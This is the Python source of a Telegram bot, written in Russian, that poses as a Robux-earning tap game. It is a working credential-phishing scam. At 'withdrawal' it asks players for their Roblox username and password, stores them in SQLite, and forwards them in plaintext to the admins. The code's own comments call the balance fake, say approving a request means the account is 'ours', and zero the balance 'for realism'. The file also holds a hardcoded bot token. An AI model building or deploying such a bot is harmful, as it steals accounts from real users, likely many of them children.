import telebot
from telebot import types
import sqlite3
import random
import datetime
import time
import hashlib
from threading import Thread

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8639865546:AAGX3yLAzXoJmm7-Gij2oGZi-428k72TRhg"  # ЗАМЕНИТЬ!
ADMIN_IDS = [1541550837]  # Замените на свои ID админов
MAX_CLICKS_PER_DAY = 500
WITHDRAW_MIN = 1000
REFERRAL_BONUS = 50
REFERRAL_PERCENT = 0.5  # 50% от тапов реферала

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER UNIQUE,
        username TEXT,
        balance REAL DEFAULT 0,
        total_clicks INTEGER DEFAULT 0,
        daily_clicks INTEGER DEFAULT 0,
        referrer_id INTEGER,
        last_click_time TIMESTAMP,
        join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_daily_reset TIMESTAMP,
        is_banned INTEGER DEFAULT 0
    )''')
    
    # Таблица заявок на вывод
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS withdraw_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        roblox_username TEXT,
        roblox_password TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        request_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Таблица для статистики
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        date DATE UNIQUE,
        total_clicks INTEGER DEFAULT 0,
        new_users INTEGER DEFAULT 0
    )''')
    
    conn.commit()
    conn.close()

def get_user(telegram_id):
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    # Проверяем, есть ли пользователь
    cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
    user = cursor.fetchone()
    
    if not user:
        # Создаем нового пользователя
        cursor.execute('''
        INSERT INTO users (telegram_id, balance, last_daily_reset)
        VALUES (?, 0, ?)
        ''', (telegram_id, datetime.datetime.now()))
        conn.commit()
        
        cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
        user = cursor.fetchone()
    
    conn.close()
    return user

def update_user(telegram_id, **kwargs):
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    for key, value in kwargs.items():
        cursor.execute(f"UPDATE users SET {key} = ? WHERE telegram_id = ?", (value, telegram_id))
    
    conn.commit()
    conn.close()

def check_daily_reset(telegram_id):
    """Проверяет, нужно ли сбросить счетчик ежедневных кликов"""
    user = get_user(telegram_id)
    
    if user[10]:  # last_daily_reset
        last_reset = datetime.datetime.strptime(user[10], '%Y-%m-%d %H:%M:%S.%f')
        now = datetime.datetime.now()
        
        if now.date() > last_reset.date():
            update_user(telegram_id, daily_clicks=0, last_daily_reset=now)
            return True
    else:
        update_user(telegram_id, last_daily_reset=datetime.datetime.now())
    
    return False

def add_withdraw_request(user_id, username, password, amount):
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO withdraw_requests (user_id, roblox_username, roblox_password, amount)
    VALUES (?, ?, ?, ?)
    ''', (user_id, username, password, amount))
    
    conn.commit()
    conn.close()

def get_withdraw_requests(status='pending'):
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    SELECT * FROM withdraw_requests WHERE status = ? ORDER BY request_date DESC
    ''', (status,))
    
    requests = cursor.fetchall()
    conn.close()
    return requests

def update_request_status(request_id, status):
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    cursor.execute("UPDATE withdraw_requests SET status = ? WHERE id = ?", (status, request_id))
    
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM users ORDER BY balance DESC")
    users = cursor.fetchall()
    
    conn.close()
    return users

def get_stats():
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    
    total_users = cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    total_clicks = cursor.execute("SELECT SUM(total_clicks) FROM users").fetchone()[0] or 0
    total_balance = cursor.execute("SELECT SUM(balance) FROM users").fetchone()[0] or 0
    
    today = datetime.date.today().isoformat()
    today_clicks = cursor.execute('''
    SELECT SUM(daily_clicks) FROM users WHERE date(last_click_time) = date('now')
    ''').fetchone()[0] or 0
    
    pending_requests = cursor.execute("SELECT COUNT(*) FROM withdraw_requests WHERE status='pending'").fetchone()[0]
    
    conn.close()
    
    return {
        'total_users': total_users,
        'total_clicks': total_clicks,
        'total_balance': total_balance,
        'today_clicks': today_clicks,
        'pending_requests': pending_requests
    }

# ==================== КЛАВИАТУРЫ ====================
def main_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    tap_btn = types.InlineKeyboardButton("👆 ТАПАТЬ (+0.98 Robux)", callback_data="tap")
    profile_btn = types.InlineKeyboardButton("📊 Профиль", callback_data="profile")
    referral_btn = types.InlineKeyboardButton("👥 Рефералы", callback_data="referral")
    withdraw_btn = types.InlineKeyboardButton("💎 ВЫВОД", callback_data="withdraw")
    bonus_btn = types.InlineKeyboardButton("🎁 Бонус", callback_data="bonus")
    top_btn = types.InlineKeyboardButton("🏆 Топ", callback_data="top")
    
    keyboard.add(tap_btn)
    keyboard.add(profile_btn, referral_btn)
    keyboard.add(withdraw_btn, bonus_btn)
    keyboard.add(top_btn)
    
    return keyboard

def admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    stats_btn = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    requests_btn = types.InlineKeyboardButton("📥 Заявки", callback_data="admin_requests")
    users_btn = types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users")
    broadcast_btn = types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")
    
    keyboard.add(stats_btn, requests_btn)
    keyboard.add(users_btn, broadcast_btn)
    
    return keyboard

# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
def get_progress_bar(clicks, total=500, length=10):
    filled = int((clicks / total) * length)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {clicks}/{total}"

def format_number(num):
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    else:
        return str(int(num))

# ==================== ОБРАБОТЧИКИ КОМАНД ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"
    
    # Проверка на реферала
    referrer_id = None
    if len(message.text.split()) > 1:
        try:
            referrer_id = int(message.text.split()[1])
            if referrer_id != user_id:
                # Начисляем бонус пригласившему
                update_user(referrer_id, balance=get_user(referrer_id)[3] + REFERRAL_BONUS)
        except:
            pass
    
    # Получаем или создаем пользователя
    user = get_user(user_id)
    
    # Если есть реферер и это новый пользователь
    if referrer_id and user[4] == 0:  # total_clicks == 0
        update_user(user_id, referrer_id=referrer_id)
    
    welcome_text = (
        "🎮 Добро пожаловать в MegaRobux Tap!\n\n"
        "👆 Тапай и зарабатывай ROBUX!\n"
        "💰 1 тап = 0.98 Robux\n"
        "🎁 Ежедневные бонусы и ДЖЕКПОТЫ!\n\n"
        "👇 Начинай тапать прямо сейчас!"
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "⚙️ Админ-панель", reply_markup=admin_keyboard())
    else:
        bot.send_message(message.chat.id, "У вас нет доступа к админ-панели.")

# ==================== ОБРАБОТЧИКИ КОЛЛБЭКОВ ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    # Проверка бана
    user = get_user(user_id)
    if user[11] == 1:  # is_banned
        bot.answer_callback_query(call.id, "Вы забанены!", show_alert=True)
        return
    
    # Сброс ежедневного счетчика если нужно
    check_daily_reset(user_id)
    user = get_user(user_id)  # Обновляем данные после возможного сброса
    
    # ===== ТАП =====
    if call.data == "tap":
        if user[5] >= MAX_CLICKS_PER_DAY:  # daily_clicks
            bot.answer_callback_query(
                call.id, 
                f"Лимит на сегодня! Завтра еще {MAX_CLICKS_PER_DAY} тапов", 
                show_alert=True
            )
            return
        
        # Базовая сумма
        earnings = 0.98
        bonus_text = ""
        
        # Система удачи
        lucky = random.random()
        
        if lucky < 0.15:  # 15% шанс на удачу
            if lucky < 0.01:  # 1% джекпот
                earnings = 50
                bonus_text = "\n\n🎉🎉🎉 ДЖЕКПОТ! +50 ROBUX 🎉🎉🎉"
            elif lucky < 0.05:  # 4% средний
                earnings = 10
                bonus_text = "\n\n🌟 УДАЧА! +10 ROBUX 🌟"
            else:  # 10% маленький
                earnings = 5
                bonus_text = "\n\n✨ НЕПЛОХО! +5 ROBUX ✨"
        
        # Обновляем баланс
        new_balance = user[3] + earnings
        
        # Начисление рефереру (если есть)
        if user[6]:  # referrer_id
            referrer_earnings = earnings * REFERRAL_PERCENT
            update_user(user[6], balance=get_user(user[6])[3] + referrer_earnings)
        
        update_user(
            user_id, 
            balance=new_balance,
            total_clicks=user[4] + 1,
            daily_clicks=user[5] + 1,
            last_click_time=datetime.datetime.now()
        )
        
        # Получаем обновленные данные
        user = get_user(user_id)
        
        # Формируем сообщение
        text = (
            f"💰 Баланс: {user[3]:.2f} Robux\n"
            f"👆 Сегодня: {user[5]}/{MAX_CLICKS_PER_DAY}\n"
            f"{get_progress_bar(user[5])}"
            f"{bonus_text}"
        )
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard()
        )
    
    # ===== ПРОФИЛЬ =====
    elif call.data == "profile":
        user = get_user(user_id)
        
        text = (
            f"📊 ТВОЙ ПРОФИЛЬ\n\n"
            f"🆔 ID: {user_id}\n"
            f"💰 Баланс: {user[3]:.2f} Robux\n"
            f"👆 Всего тапов: {user[4]}\n"
            f"📅 Сегодня: {user[5]}/{MAX_CLICKS_PER_DAY}\n"
            f"📆 В игре с: {user[8][:10]}\n"
        )
        
        if user[6]:  # referrer_id
            text += f"👥 Приглашен: @{get_user(user[6])[2] or 'пользователь'}\n"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard()
        )
    
    # ===== РЕФЕРАЛЫ =====
    elif call.data == "referral":
        referral_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        
        # Считаем рефералов
        conn = sqlite3.connect('robux_bot.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
        referral_count = cursor.fetchone()[0]
        conn.close()
        
        text = (
            f"👥 РЕФЕРАЛЬНАЯ СИСТЕМА\n\n"
            f"💰 За каждого друга: +{REFERRAL_BONUS} Robux\n"
            f"💸 50% от тапов друга навсегда!\n\n"
            f"👥 Твои рефералы: {referral_count}\n\n"
            f"🔗 Твоя ссылка:\n{referral_link}"
        )
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard()
        )
    
    # ===== ВЫВОД =====
    elif call.data == "withdraw":
        user = get_user(user_id)
        
        if user[3] < WITHDRAW_MIN:
            bot.answer_callback_query(
                call.id,
                f"Нужно минимум {WITHDRAW_MIN} Robux для вывода!",
                show_alert=True
            )
            return
        
        msg = bot.edit_message_text(
            f"💎 ВЫВОД СРЕДСТВ\n\n"
            f"Твой баланс: {user[3]:.2f} Robux\n"
            f"Минимум: {WITHDRAW_MIN} Robux\n\n"
            f"Введи свой НИК в Roblox:",
            call.message.chat.id,
            call.message.message_id
        )
        
        # Сохраняем состояние
        bot.register_next_step_handler(msg, process_withdraw_username)
    
    # ===== БОНУС =====
    elif call.data == "bonus":
        # Проверяем, забирал ли сегодня бонус (в last_click_time)
        user = get_user(user_id)
        last_bonus = user[7]  # last_click_time
        
        if last_bonus:
            last_bonus_date = datetime.datetime.strptime(last_bonus[:10], '%Y-%m-%d').date()
            today = datetime.date.today()
            
            if last_bonus_date == today:
                bot.answer_callback_query(
                    call.id,
                    "Ты уже забрал бонус сегодня!",
                    show_alert=True
                )
                return
        
        # Начисляем бонус
        bonus_amount = random.randint(3, 8)
        update_user(user_id, balance=user[3] + bonus_amount, last_click_time=datetime.datetime.now())
        
        bot.answer_callback_query(
            call.id,
            f"🎁 Ты получил {bonus_amount} Robux!",
            show_alert=True
        )
        
        # Обновляем сообщение
        user = get_user(user_id)
        bot.edit_message_text(
            f"💰 Баланс: {user[3]:.2f} Robux\n👆 Сегодня: {user[5]}/{MAX_CLICKS_PER_DAY}",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard()
        )
    
    # ===== ТОП =====
    elif call.data == "top":
        users = get_all_users()
        top_users = users[:10]
        
        text = "🏆 ТОП 10 ТАПЕРОВ 🏆\n\n"
        
        for i, u in enumerate(top_users, 1):
            username = u[2] or f"ID{u[1]}"
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "👤"
            text += f"{medal} {i}. @{username} — {u[3]:.2f} Robux\n"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard()
        )
    
    # ===== АДМИНКА =====
    elif call.data.startswith("admin_"):
        if user_id not in ADMIN_IDS:
            bot.answer_callback_query(call.id, "Нет доступа")
            return
        
        action = call.data.replace("admin_", "")
        
        # Статистика
        if action == "stats":
            stats = get_stats()
            
            text = (
                "📊 СТАТИСТИКА БОТА\n\n"
                f"👥 Всего юзеров: {stats['total_users']}\n"
                f"👆 Всего кликов: {format_number(stats['total_clicks'])}\n"
                f"💰 Фейковый баланс: {format_number(stats['total_balance'])} Robux\n"
                f"📅 Кликов сегодня: {stats['today_clicks']}\n"
                f"📥 Заявок: {stats['pending_requests']}"
            )
            
            bot.edit_message_text(
                text,
                call.message.chat.id,
                call.message.message_id,
                reply_markup=admin_keyboard()
            )
        
        # Заявки
        elif action == "requests":
            requests = get_withdraw_requests()
            
            if not requests:
                bot.edit_message_text(
                    "📥 Нет новых заявок",
                    call.message.chat.id,
                    call.message.message_id,
                    reply_markup=admin_keyboard()
                )
                return
            
            text = "📥 ЗАЯВКИ НА ВЫВОД\n\n"
            
            for req in requests[:10]:
                req_id, user_id, roblox_user, roblox_pass, amount, status, date = req
                text += (
                    f"🆔 Заявка #{req_id}\n"
                    f"👤 Юзер: {user_id}\n"
                    f"🎮 Roblox: {roblox_user}\n"
                    f"🔑 Пароль: {roblox_pass}\n"
                    f"💰 Сумма: {amount}\n"
                    f"📅 Дата: {date[:16]}\n"
                    f"─────────────\n"
                )
            
            # Добавляем кнопки для заявок
            keyboard = types.InlineKeyboardMarkup(row_width=3)
            for req in requests[:5]:
                req_id = req[0]
                keyboard.add(
                    types.InlineKeyboardButton(f"✅ {req_id}", callback_data=f"approve_{req_id}"),
                    types.InlineKeyboardButton(f"❌ {req_id}", callback_data=f"reject_{req_id}")
                )
            keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="admin_back"))
            
            bot.edit_message_text(
                text,
                call.message.chat.id,
                call.message.message_id,
                reply_markup=keyboard
            )
        
        # Пользователи
        elif action == "users":
            users = get_all_users()[:20]
            
            text = "👥 ПОСЛЕДНИЕ ПОЛЬЗОВАТЕЛИ\n\n"
            
            for u in users[:15]:
                telegram_id, username, balance, total_clicks, daily_clicks = u[1], u[2], u[3], u[4], u[5]
                text += f"👤 @{username or telegram_id} | {balance:.2f} R | 👆 {total_clicks}\n"
            
            bot.edit_message_text(
                text,
                call.message.chat.id,
                call.message.message_id,
                reply_markup=admin_keyboard()
            )
        
        # Рассылка
        elif action == "broadcast":
            msg = bot.edit_message_text(
                "📢 Введите текст для рассылки всем пользователям:",
                call.message.chat.id,
                call.message.message_id
            )
            bot.register_next_step_handler(msg, process_broadcast)
        
        # Назад
        elif action == "back":
            bot.edit_message_text(
                "⚙️ Админ-панель",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=admin_keyboard()
            )
    
    # Обработка одобрения заявок
    elif call.data.startswith("approve_"):
        request_id = int(call.data.replace("approve_", ""))
        update_request_status(request_id, "approved")
        bot.answer_callback_query(call.id, "Заявка одобрена (аккаунт наш!)")
        
        # Обновляем список
        requests = get_withdraw_requests()
        if requests:
            callback_handler(call)  # Перезапускаем с теми же данными
        else:
            bot.edit_message_text(
                "📥 Нет новых заявок",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=admin_keyboard()
            )
    
    elif call.data.startswith("reject_"):
        request_id = int(call.data.replace("reject_", ""))
        update_request_status(request_id, "rejected")
        bot.answer_callback_query(call.id, "Заявка отклонена")
        
        # Обновляем список
        requests = get_withdraw_requests()
        if requests:
            callback_handler(call)
        else:
            bot.edit_message_text(
                "📥 Нет новых заявок",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=admin_keyboard()
            )

# ==================== ОБРАБОТЧИКИ СОСТОЯНИЙ ====================
def process_withdraw_username(message):
    user_id = message.from_user.id
    username = message.text
    
    msg = bot.send_message(
        message.chat.id,
        f"✅ Ник принят: {username}\n\n"
        f"Теперь введи ПАРОЛЬ от аккаунта Roblox\n"
        f"(это нужно для подтверждения владения аккаунтом)"
    )
    
    bot.register_next_step_handler(msg, process_withdraw_password, username)

def process_withdraw_password(message, roblox_username):
    user_id = message.from_user.id
    password = message.text
    user = get_user(user_id)
    
    # Сохраняем заявку
    add_withdraw_request(user_id, roblox_username, password, user[3])
    
    # Обнуляем баланс (для реалистичности)
    update_user(user_id, balance=0)
    
    bot.send_message(
        message.chat.id,
        "✅ Заявка на вывод принята!\n"
        "Ожидайте 24-48 часов (технические работы на серверах Roblox)\n\n"
        "🎁 Пока ждешь, продолжай тапать!",
        reply_markup=main_keyboard()
    )
    
    # Уведомление админам
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(
                admin_id,
                f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                f"👤 Юзер: @{message.from_user.username or 'NoName'} (ID: {user_id})\n"
                f"🎮 Roblox: {roblox_username}\n"
                f"🔑 Пароль: {password}\n"
                f"💰 Сумма: {user[3]:.2f} Robux"
            )
        except:
            pass

def process_broadcast(message):
    text = message.text
    
    # Получаем всех пользователей
    conn = sqlite3.connect('robux_bot.db')
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id FROM users")
    users = cursor.fetchall()
    conn.close()
    
    sent = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, "📢 Рассылка началась...")
    
    for user in users:
        try:
            bot.send_message(user[0], f"📢 РАССЫЛКА:\n\n{text}")
            sent += 1
        except:
            failed += 1
        time.sleep(0.05)  # Чтобы не забанили за флуд
    
    bot.edit_message_text(
        f"✅ Рассылка завершена!\n"
        f"📨 Отправлено: {sent}\n"
        f"❌ Не доставлено: {failed}",
        message.chat.id,
        status_msg.message_id
    )

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    print("🤖 Бот запускается...")
    init_db()
    print("✅ База данных инициализирована")
    print(f"👤 Админы: {ADMIN_IDS}")
    print("🚀 Бот работает! Нажми Ctrl+C для остановки")
    
    # Запускаем бота
    bot.infinity_polling()
